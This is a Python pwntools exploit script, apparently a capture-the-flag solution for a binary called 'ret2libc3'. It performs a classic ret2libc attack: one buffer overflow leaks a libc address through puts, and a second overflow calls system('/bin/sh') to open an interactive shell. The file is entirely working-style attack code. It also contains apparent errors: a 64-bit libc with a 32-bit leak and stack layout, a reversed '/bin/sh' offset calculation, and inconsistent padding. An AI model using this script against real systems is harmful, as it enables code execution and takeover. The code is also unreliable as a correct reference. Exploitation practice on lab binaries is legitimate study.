from pwn import *
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print("leak libc_start_main_got addr and return to main again")
payload = flat([b'A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter(b'Can you find it !?', payload)

print("get the related addr")
libc_start_main_addr = u32(sh.recv()[0:4])
print("libc_start_main_addr: " + hex(libc_start_main_addr))

libc_start_main_system_offset = libc.symbols['system'] - libc.symbols['__libc_start_main']
system_addr = libc_start_main_addr + libc_start_main_system_offset
libc_start_main_sh_offset = libc.symbols['system'] - next(libc.search(b'/bin/sh'))
binsh_addr = libc_start_main_addr + libc_start_main_sh_offset

print("get shell")
payload = flat([b'A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()

